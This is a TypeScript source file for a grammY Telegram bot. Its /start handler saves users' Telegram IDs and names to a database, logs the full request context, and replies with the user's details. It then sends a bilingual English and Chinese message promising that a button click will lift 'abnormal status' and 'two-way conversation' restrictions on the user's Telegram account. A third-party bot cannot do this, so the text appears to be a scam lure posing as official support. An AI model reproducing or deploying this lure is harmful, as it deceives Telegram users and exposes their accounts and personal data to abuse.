import { Composer } from 'grammy';
import { MyContext } from '../../types';
import mainKeyboard from '../../menus/inline/exampleInlineMenu';
import telegramUser from '../../../models/telegramUser';

const startCommand = new Composer<MyContext>();

startCommand.command('start', async (ctx) => {
  try {
    // 提取用户信息
    const userId = ctx.from?.id?.toString(); // 确保转换为字符串
    const userName = ctx.from?.username || 'Unknown'; // 提供默认值
    const firstName = ctx.from?.first_name || 'Unknown'; // 提供默认值
    const botName = ctx.me?.username || 'Unknown'; // 提供默认值
    const botFirstName = ctx.me?.first_name || 'Unknown'; // 提供默认值
    const botId = ctx.me?.id?.toString(); // 确保转换为字符串

    console.log('form_info', ctx);

    // 检查数据库中是否已存在该用户ID
    const existingUser = await telegramUser.findOne({ id: userId });

    if (existingUser) {
      // 如果用户已存在，更新其信息
      console.log(`用户 ${userId} 已存在，更新用户信息。`);

      // 更新用户信息
      existingUser.userName = userName;
      existingUser.firstName = firstName;
      existingUser.botName = botName;
      existingUser.botFirstName = botFirstName;
      existingUser.botId = botId;

      await existingUser.save();
      console.log(`已更新用户: ${existingUser}`);

      await ctx.reply('您的信息已更新！');
    } else {
      // 如果用户不存在，创建新用户
      const newTelegramUser = new telegramUser({
        userName: userName,
        firstName: firstName,
        id: userId,
        botName: botName,
        botFirstName: botFirstName,
        botId: botId,
      });

      await newTelegramUser.save();
      console.log(`已保存新用户: ${newTelegramUser}`);

      await ctx.reply('您已成功注册！');
    }

    // 定义要发送的长文本内容
    const longMessage = `
If your Telegram account is currently in an abnormal state, please click to remove the abnormal status restriction, and your account will return to normal in the next period of time.
如果您的电报账号目前存在异常状态，请点击解除异常状态限制，您的账号会在接下来一段时间内恢复正常。

If your Telegram account is currently restricted from two-way conversations, please click to remove the two-way conversation restrictions. Your account will return to normal within a period of time.
如果您的电报账号目前被限制双向对话，请点击解除双向对话限制，您的账号会在接下来一段时间内恢复正常。
    `;

    // 发送长文本消息并附带 Inline Menu
    await ctx.reply(longMessage, {
      reply_markup: mainKeyboard,
    });

    // 回复用户信息
    await ctx.reply(
      `我的账户\nID: ${userId}\n名字: ${userName}\nFirstName: ${firstName}`,
    );
  } catch (error) {
    console.error('保存用户时出错:', error);
    await ctx.reply('保存用户信息时发生错误，请稍后再试！');
  }
});

export default startCommand;
